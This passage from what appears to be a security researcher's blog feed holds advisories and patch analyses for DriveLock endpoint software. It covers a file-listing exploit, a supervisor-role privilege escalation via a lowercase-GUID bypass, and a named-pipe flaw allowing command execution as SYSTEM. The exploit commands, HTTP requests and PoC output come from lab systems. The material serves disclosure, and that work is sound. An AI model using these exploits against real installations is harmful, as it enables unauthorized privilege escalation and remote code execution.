+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code> environment var and run the included <a href="/assets/drivelock/poc/poc-file-listing.sh">PoC - file-listing</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ ./poc-file-listing.sh
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<p>The following demonstrates the usage of the exploit suite:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">--tenant</span> doetess <span class="nt">-u</span> stuxxn <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> dirList <span class="s1">'packer-win2019.pentest.lab'</span> <span class="s1">'C:\\temp'</span>
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: stuxxn
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/infrastructure/diagnosticFileListing/packer-win2019.pentest.lab/1/C%3A%5Ctemp
+<span class="o">[</span>
+    FileEntry<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s1">'ConfigurationFile.ini'</span>, <span class="nv">fsize</span><span class="o">=</span>481, <span class="nv">ftype</span><span class="o">=</span>&lt;EntryType.FILE: 1&gt;<span class="o">)</span>,
+    FileEntry<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s1">'SQLServer2019-x64-ENU-Dev.iso'</span>, <span class="nv">fsize</span><span class="o">=</span>1426724864, <span class="nv">ftype</span><span class="o">=</span>&lt;EntryType.FILE: 1&gt;<span class="o">)</span>,
+    FileEntry<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s1">'SSMS-Setup-ENU.exe'</span>, <span class="nv">fsize</span><span class="o">=</span>495847104, <span class="nv">ftype</span><span class="o">=</span>&lt;EntryType.FILE: 1&gt;<span class="o">)</span>
+<span class="o">]</span>
+</code></pre></div></div>
+
+<p>To get the <code class="language-plaintext highlighter-rouge">DES</code> name, required for the exploit, use the <code class="language-plaintext highlighter-rouge">https://192.168.60.10:4568/api/administration/infrastructure/listDes</code> endpoint.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/administration/infrastructure/listDes</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.60.10:4568</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer XXX</span>
+<span class="na">Lang</span><span class="p">:</span> <span class="s">en</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://192.168.60.10:4568</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"servers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"desName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"packer-win2019.pentest.lab"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"desType"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"httpAddress"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://packer-win2019.pentest.lab:6067"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"tenant"</span><span class="p">:</span><span class="w"> </span><span class="s2">"root"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>]]></content><author><name></name></author><category term="patch analysis" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Privilege Escalation via PATCH role assignment</title><link href="/patch%20analysis/2026/03/01/dl-DES-privEscaltion-role.html" rel="alternate" type="text/html" title="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Privilege Escalation via PATCH role assignment" /><published>2026-03-01T00:00:00+00:00</published><updated>2026-03-01T00:00:00+00:00</updated><id>/patch%20analysis/2026/03/01/dl-DES-privEscaltion-role</id><content type="html" xml:base="/patch%20analysis/2026/03/01/dl-DES-privEscaltion-role.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h1 id="overview">Overview</h1>
+<p>During the update of an existing role assignment, the application does not properly verify that the assigned role is the built-in <code class="language-plaintext highlighter-rouge">supervisor</code> role.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.Permissions_Manage</code></li>
+</ul>
+
+<h2 id="impact">Impact</h2>
+<p>A user can assign himself the built-in <code class="language-plaintext highlighter-rouge">supervisor - 5964077F-DEC3-4AA5-ADAF-B56B38A7007D</code> role, which allows access to every existing endpoint available in the application.</p>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>During the assignment of a role to a user there is a check that the assigned role is not the built-in <code class="language-plaintext highlighter-rouge">supervisor</code> role and it ensures that the user who performs the request owns all permissions which are included in the assigned role - <code class="language-plaintext highlighter-rouge">if (!creatorIsSupervisor &amp;&amp; !userPermissionsLookup.has(p.type)</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nx">createRoleAssignment</span><span class="p">(</span><span class="nx">creatorIsSupervisor</span><span class="p">,</span> <span class="nx">creator</span><span class="p">)</span> <span class="p">{</span>
+<span class="c1">// ....</span>
+        <span class="c1">// 1. Fetch all permissions of the creator</span>
+        <span class="nx">userPermissions</span> <span class="o">=</span> <span class="nx">GetAllPermissionsForAccount</span><span class="p">(</span><span class="nx">creator</span><span class="p">)</span>
+        <span class="c1">// 2. Convert to lookup structure for fast checks</span>
+        <span class="nx">userPermissionsLookup</span> <span class="o">=</span> <span class="nx">CreateSet</span><span class="p">(</span><span class="nx">userPermissions</span><span class="p">)</span>
+
+        <span class="c1">// 3. Validate each permission required by the role</span>
+        <span class="nx">FOR</span> <span class="nx">EACH</span> <span class="nx">permission</span> <span class="nx">IN</span> <span class="nx">role</span><span class="p">.</span><span class="nx">permissions</span> <span class="nx">DO</span>
+            <span class="nx">IF</span> <span class="nx">creatorIsSupervisor</span> <span class="nx">IS</span> <span class="nx">FALSE</span> <span class="nx">AND</span>
+            <span class="nx">userPermissionsLookup</span> <span class="nx">DOES</span> <span class="nx">NOT</span> <span class="nx">CONTAIN</span> <span class="nx">permission</span><span class="p">.</span><span class="nx">type</span> <span class="nx">THEN</span>
+                <span class="nx">THROW</span> <span class="nx">UnauthorizedException</span><span class="p">(</span>
+                    <span class="dl">"</span><span class="s2">User is not allowed to assign role</span><span class="dl">"</span>
+                <span class="p">)</span>
+            <span class="nx">END</span> <span class="nx">IF</span>
+        <span class="nx">END</span> <span class="nx">FOR</span>
+<span class="c1">// ....</span>
+</code></pre></div></div>
+
+<p>The check <code class="language-plaintext highlighter-rouge">user performing the request has all permissions in role</code> is no included in the <code class="language-plaintext highlighter-rouge">updateRoleAssignment</code>.</p>
+
+<p>To further bypass the check <code class="language-plaintext highlighter-rouge">roleAssignment.roleId === SUPERVISOR_ROLE_ID &amp;&amp; !token.isSupervisor</code> and assign the <code class="language-plaintext highlighter-rouge">supervisor</code> role the used <code class="language-plaintext highlighter-rouge">role-guid</code> must be lower case for example.</p>
+
+<p>The previous mentioned check compares the provided <code class="language-plaintext highlighter-rouge">role-guid</code> as <code class="language-plaintext highlighter-rouge">string</code> variable with the following variable:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">SUPERVISOR_ROLE_ID</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">5964077F-DEC3-4AA5-ADAF-B56B38A7007D</span><span class="dl">'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>As the <code class="language-plaintext highlighter-rouge">JavaScript</code> string operator <code class="language-plaintext highlighter-rouge">===</code> is case-sensitive, its sufficient to use a lower case version of the <code class="language-plaintext highlighter-rouge">role-guid</code> to bypass the check.</p>
+
+<h2 id="proof-of-concept--exploit">Proof of Concept / Exploit</h2>
+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code> environment var and run the included <a href="/assets/drivelock/poc/poc-privEscalation-patchRoleAssignment.py">PoC - privEscalation-patchRoleAssignment</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ uv run poc-privEscalation-patchRoleAssignment.py
+</code></pre></div></div>
+
+<h3 id="exploit">Exploit</h3>
+<p>The following demonstrates the usage of the exploit suite:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">-u</span> <span class="s1">'test-patch@local.dev'</span> <span class="nt">-t</span> doetess <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> patch-role-assignment
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: test-patch@local.dev
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+Using User GUID from JWT - 947a6e0e-30e1-4a1c-96f2-2a673760e04e
+Query role assignments <span class="k">for </span>user - 947a6e0e-30e1-4a1c-96f2-2a673760e04e
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/account/947a6e0e-30e1-4a1c-96f2-2a673760e04e/role-assignments
+<span class="o">[</span>INFO] Patching existing role assignment:
+<span class="o">{</span>
+    <span class="s1">'roleAssignmentID'</span>: <span class="s1">'e029df80-3441-45f2-9d07-4be037b28202'</span>,
+    <span class="s1">'roleAssignmentType'</span>: 4,
+    <span class="s1">'role'</span>: <span class="o">{</span><span class="s1">'id'</span>: <span class="s1">'5b359bdb-8e17-4592-9f75-6cd8f3184f27'</span>, <span class="s1">'flags'</span>: 2, <span class="s1">'displayName'</span>: <span class="s1">'API-Key'</span>, <span class="s1">'description'</span>: <span class="s1">''</span>, <span class="s1">'createdDate'</span>: <span class="s1">'2025-12-21T08:38:27.45'</span>, <span class="s1">'requireMFA'</span>: False<span class="o">}</span>
+<span class="o">}</span>
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/identity/permissions/roleAssignments
+<span class="o">[</span>DEBUG] Patch object:
+<span class="o">{</span>
+    <span class="s1">'id'</span>: <span class="s1">'e029df80-3441-45f2-9d07-4be037b28202'</span>,
+    <span class="s1">'userId'</span>: <span class="s1">'947a6e0e-30e1-4A1C-96f2-2A673760E04E'</span>,
+    <span class="s1">'roleId'</span>: <span class="s1">'5964077F-dEC3-4Aa5-adaF-b56b38a7007d'</span>,
+    <span class="s1">'name'</span>: None,
+    <span class="s1">'assignmentType'</span>: 4,
+    <span class="s1">'targetOuFilter'</span>: None,
+    <span class="s1">'targetGroup'</span>: None,
+    <span class="s1">'targetGroupName'</span>: None
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>]]></content><author><name></name></author><category term="patch analysis" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[Advisory - DriveLock] Multiple vulnerabilities - DES Privileges Escalation &amp;amp; Agent LPE</title><link href="/advisory/2026/02/14/drivelock-multiple-vulnerabilities.html" rel="alternate" type="text/html" title="[Advisory - DriveLock] Multiple vulnerabilities - DES Privileges Escalation &amp;amp; Agent LPE" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>/advisory/2026/02/14/drivelock-multiple-vulnerabilities</id><content type="html" xml:base="/advisory/2026/02/14/drivelock-multiple-vulnerabilities.html"><![CDATA[<h1 id="timeline">Timeline</h1>
+
+<ul>
+  <li>2025-10-01: Sent details about vulnerability - CVE-2025-67794 - to vendor</li>
+  <li>2025-11-04: Sent details about vulnerability - CVE-2025-67793 - to vendor</li>
+  <li>2025-12-16: Patches released</li>
+</ul>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[Timeline]]></summary></entry><entry><title type="html">[Advisory - DriveLock] DriveLock Enterprise Service - Privilege escalation to Supervisor</title><link href="/advisory/2026/02/14/dl-DES-priv-escalation.html" rel="alternate" type="text/html" title="[Advisory - DriveLock] DriveLock Enterprise Service - Privilege escalation to Supervisor" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>/advisory/2026/02/14/dl-DES-priv-escalation</id><content type="html" xml:base="/advisory/2026/02/14/dl-DES-priv-escalation.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>DriveLock Enterprise Service (DES), is the central server component of the DriveLock security platform</p>
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+<p>…</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>…</p>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[Advisory - DriveLock] DriveLock Agent - Arbitrary file write allows LPE</title><link href="/advisory/2026/02/14/dl-agent-LPE.html" rel="alternate" type="text/html" title="[Advisory - DriveLock] DriveLock Agent - Arbitrary file write allows LPE" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>/advisory/2026/02/14/dl-agent-LPE</id><content type="html" xml:base="/advisory/2026/02/14/dl-agent-LPE.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h2 id="tested-version">Tested version</h2>
+<pre><code class="language-ps1">PS C:\Users\pentest&gt; Get-FileHash "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          D80D25A33FE3C39C72C7204C6E4AC780A51F8259BD38B9E2A7E85000C7DA66A9       C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+
+PS C:\Users\pentest&gt; Get-ItemProperty "C:\Program Files\CenterTools\DriveLock\DriveLock.exe" |fl -Property versioninfo
+
+
+VersionInfo : File:             C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+              InternalName:     DriveLock.exe
+              OriginalFilename: DriveLock.exe
+              FileVersion:      25.1.4.58314
+              FileDescription:  Agent service
+              Product:          DriveLock
+              ProductVersion:   25.1.4.58314
+              Debug:            False
+              Patched:          False
+              PreRelease:       False
+              PrivateBuild:     False
+              SpecialBuild:     False
+              Language:         English (United States)
+</code></pre>
+
+<h1 id="vulnerabilities-overview">Vulnerabilities overview</h1>
+<h2 id="1-drivelock-service---heap-buffer-overflow">1) DriveLock service - Heap buffer overflow</h2>
+<p>…</p>
+<h2 id="2-log-folder-permissions---rw-everyone">2) Log folder permissions - RW Everyone</h2>
+<p>…</p>
+
+<p>References how to exploit this setup:</p>
+<ul>
+  <li><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AD_Abusing_privileged_file_operations.pdf">Troopers 19 - Absuing privileged file operations,  18th – 22nd March 2019</a></li>
+  <li><a href="https://www.synacktiv.com/en/advisories/windows-10-plugscheduler-elevation-of-privilege">Synactive - Windows 10 PlugScheduler elevation of privilege</a></li>
+</ul>
+
+<h1 id="proof-of-concept">Proof of Concept</h1>
+<p>…</p>
+
+<h2 id="details">Details</h2>
+<p>…</p>
+
+<h2 id="demonstration">Demonstration</h2>
+<p>…</p>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate</title><link href="/advisory/2025/09/26/drivelock-rce-duplicate.html" rel="alternate" type="text/html" title="[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate" /><published>2025-09-26T00:00:00+00:00</published><updated>2025-09-26T00:00:00+00:00</updated><id>/advisory/2025/09/26/drivelock-rce-duplicate</id><content type="html" xml:base="/advisory/2025/09/26/drivelock-rce-duplicate.html"><![CDATA[<h1 id="important---duplicate">IMPORTANT - Duplicate</h1>
+<p>The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch.</p>
+
+<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h2 id="tested-software-version">Tested software version</h2>
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; Get-FileHash "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          3ED7B4BA35E4784EED44F3A20394EF24FE9BB73CEF0B46D1D732EFD50C82F19B       C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+
+PS C:\&gt; Get-ItemProperty "C:\Program Files\CenterTools\DriveLock\DriveLock.exe" |fl -Property versioninfo
+
+VersionInfo : File:             C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+              InternalName:     DriveLock.exe
+              OriginalFilename: DriveLock.exe
+              FileVersion:      25.1.2.57576
+              FileDescription:  Agent service
+              Product:          DriveLock
+              ProductVersion:   25.1.2.57576
+              Debug:            False
+              Patched:          False
+              PreRelease:       False
+              PrivateBuild:     False
+              SpecialBuild:     False
+              Language:         English (United States)
+</code></pre>
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+
+<p>During the installation of the product a Window service named <code class="language-plaintext highlighter-rouge">DriveLock</code> is installed.</p>
+
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; Get-CimInstance -ClassName win32_service | ?{$_.Name -match '^drivelock'} |select *
+
+
+Name                    : DriveLock
+Status                  : OK
+ExitCode                : 0
+DesktopInteract         : False
+ErrorControl            : Normal
+PathName                : "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
+ServiceType             : Own Process
+StartMode               : Auto
+Caption                 : DriveLock
+Description             : Locks removable drives based on company policy.
+InstallDate             :
+CreationClassName       : Win32_Service
+Started                 : True
+SystemCreationClassName : Win32_ComputerSystem
+SystemName              : DESKTOP-LSJFSMS
+AcceptPause             : False
+AcceptStop              : True
+DisplayName             : DriveLock
+ServiceSpecificExitCode : 0
+StartName               : LocalSystem
+State                   : Running
+TagId                   : 0
+CheckPoint              : 0
+DelayedAutoStart        : False
+ProcessId               : 1708
+WaitHint                : 0
+PSComputerName          :
+</code></pre>
+<p>This services exposes the <a href="https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipe</a> <code class="language-plaintext highlighter-rouge">\Device\NamedPipe\drivelock</code>.
+<img src="/assets/drivelock/drivelock-pipe.PNG" alt="Named pipe - drivelock" />
+<em>Named pipe - drivelock</em></p>
+
+<p>As shown above the group <code class="language-plaintext highlighter-rouge">everyone</code> has the access level <code class="language-plaintext highlighter-rouge">Full control</code> on this object. This allows an authenticated attacker and even <code class="language-plaintext highlighter-rouge">anonymous</code> to open the pipe.</p>
+
+<p>The service, exposing the named pipe, implements a simple <code class="language-plaintext highlighter-rouge">remote procedure call - RPC</code> interface by reading a command struct from the connected clients.</p>
+
+<p>The handler for the commands is located at the <code class="language-plaintext highlighter-rouge">Relative virtual address (RVA)</code> - <code class="language-plaintext highlighter-rouge">0x2b0a80</code> in the <code class="language-plaintext highlighter-rouge">drivelock.exe</code> binary.
+One of these supported commands is <code class="language-plaintext highlighter-rouge">PM_COMMAND</code>, which is a simple wrapper of <code class="language-plaintext highlighter-rouge">CreateProcessW</code>.</p>
+
+<p><img src="/assets/drivelock/onMsg-exec.PNG" alt="Command handler - PM_COMMAND" />
+<em>Command handler - PM_COMMAND</em></p>
+
+<p>The argument <code class="language-plaintext highlighter-rouge">lpCommandLine</code> of the <code class="language-plaintext highlighter-rouge">CreateProcessW</code> call is taken from the command struct sent by the connected client, which allows full control of the executed binary and its arguments.</p>
+
+<p><strong>Summary</strong>:</p>
+
+<p>An attacker which can open a connection to the named pipe <code class="language-plaintext highlighter-rouge">drivelock</code>, can execute a arbitrary command, controlling the full command line, in the context of the user <code class="language-plaintext highlighter-rouge">NT authority\System</code>.
+This can be done locally to escalate privileges - <code class="language-plaintext highlighter-rouge">LPE</code> - to <code class="language-plaintext highlighter-rouge">NT authority\System</code> from a normal user or the <code class="language-plaintext highlighter-rouge">named pipe</code> can be opend on a remote machine which allows <code class="language-plaintext highlighter-rouge">remote code execution - RCE</code> as <code class="language-plaintext highlighter-rouge">NT authority\System</code>.</p>
+
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>To exploit this a connection to the named pipe <code class="language-plaintext highlighter-rouge">drivelock</code> has to be opend and a <code class="language-plaintext highlighter-rouge">PM_COMMAND</code> message should be sent.
+The following snippets show running the included <a href="/assets/drivelock/poc/dl-pipe-exec.cpp">PoC - dl-pipe-exe</a> on the local machine against a VM - <code class="language-plaintext highlighter-rouge">DESKTOP-LSJFSMS - 192.168.56.103</code> with an installed <code class="language-plaintext highlighter-rouge">DriveLock</code> agent.</p>
+
+<p>It executes the command <code class="language-plaintext highlighter-rouge">whoami &gt; C:\rce-poc.txt</code> to get the user details of the user who created the process.</p>
+
+<pre><code class="language-ps1">PS &gt; .\Debug\dl-pipe-exec.exe 192.168.56.103 cmd /C '\"whoami /all &gt;C:\rce-poc.txt\"'
+Using host: 192.168.56.103
+------&lt; PIPE exploit &gt;----
+Opening pipe: \\192.168.56.103\pipe\drivelock
+Using cmdline: -- cmd /C "whoami /all &gt;C:\rce-poc.txt" --
+Result: 1000 -- 9007628751470592
+</code></pre>
+<p><em>Running PoC on local system</em></p>
+
+<p><img src="/assets/drivelock/procmon-exec.PNG" alt="Procmon details about processes" />
+<em>Procmon details about processes</em></p>
+
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; type C:\rce-poc.txt
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+</code></pre>
+<p><em>Output of the executed whoami command</em></p>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version <code class="language-plaintext highlighter-rouge">25.1</code>, <code class="language-plaintext highlighter-rouge">24.2</code> and <code class="language-plaintext highlighter-rouge">24.1</code> were published on <strong>2025-07-30</strong>, which fixes the vulnerability.</p>
+
+<p>Patched versions:</p>
+<ul>
+  <li>25.1.4.58328 - 25.1 Patch 2</li>
+  <li>24.2.6.58383 - 24.2 Patch 4</li>
+  <li>24.1.5.58384 - 24.1 Patch 3</li>
+</ul>
+
+<p>No other mitigations are known.</p>
+
+<h2 id="patch-analysis">Patch analysis</h2>
+<p>To fix the above shown vulnerability they implemented a few security check and settings.</p>
+
+<p>1) First of all the call to <code class="language-plaintext highlighter-rouge">CreateNamedPipeW</code> includes the <code class="language-plaintext highlighter-rouge">dwOpenMode</code> flag <code class="language-plaintext highlighter-rouge">PIPE_REJECT_REMOTE_CLIENTS</code>. This removes the <code class="language-plaintext highlighter-rouge">RCE</code> from the vulnerability, because opening the <code class="language-plaintext highlighter-rouge">NamedPipe</code> over the network results in a ErrorCode <code class="language-plaintext highlighter-rouge">0x5 - Access denied</code>.</p>
+
+<p>2) The second mitigation includes a check if the binary is running as a server, which is true in the service component. If this is true, it disables a few commands implemented in <code class="language-plaintext highlighter-rouge">on_pipeMessage</code> handler, like the exploited <code class="language-plaintext highlighter-rouge">PM_COMMAND</code> operation.</p>
+
+<p><img src="/assets/drivelock/onMsg-fixed.png" alt="onMessage - fixed" />
+<em>onMessage - fixed</em></p>
+
+<p>3) The third mitigation checks the path of the client process, which connted to the pipe and ensures that it is placed in the installation directory of <code class="language-plaintext highlighter-rouge">DirveLock</code>. For example if a client process binary is <code class="language-plaintext highlighter-rouge">C:\temp\exploit.exe</code> the message handling is aborted with an error message <code class="language-plaintext highlighter-rouge">Forbidden caller</code>.</p>
+
+<p><img src="/assets/drivelock/onMsg-forbidden-caller.png" alt="onMessage - forbidden caller" />
+<em>onMessage - forbidden caller</em></p>
+
+<p>This is is only active if the <code class="language-plaintext highlighter-rouge">isServer</code> flag is true. But imho this is not working as intended. Using <code class="language-plaintext highlighter-rouge">process hollowing</code> an attacker should be able to spoof the binary path of the process and bypasses the check. I did not verify this.</p>
+
+<h1 id="timeline">Timeline</h1>
+<ul>
+  <li>2025-09-13: Initial contact via <code class="language-plaintext highlighter-rouge">security@drivelock.com</code></li>
+  <li>2025-09-16: No answer, try to contact <code class="language-plaintext highlighter-rouge">info@drivelock.com</code></li>
+  <li>2025-09-18: No answer, try to contact <code class="language-plaintext highlighter-rouge">security@drivelock.com</code> again</li>
+  <li>2025-09-19: No answer, try to contact via <a href="https://www.drivelock.com/en/contact">DriveLock - Contact</a>, got marketing E-Mail a few minutes later but no answer</li>
+  <li>2025-09-19: Posted tweet on <code class="language-plaintext highlighter-rouge">X</code> referencing <code class="language-plaintext highlighter-rouge">@drivelock_de</code> for contact</li>
+  <li>2025-09-22: Posted message on <code class="language-plaintext highlighter-rouge">LinkedIn</code>, referencing <code class="language-plaintext highlighter-rouge">drivelockse</code></li>
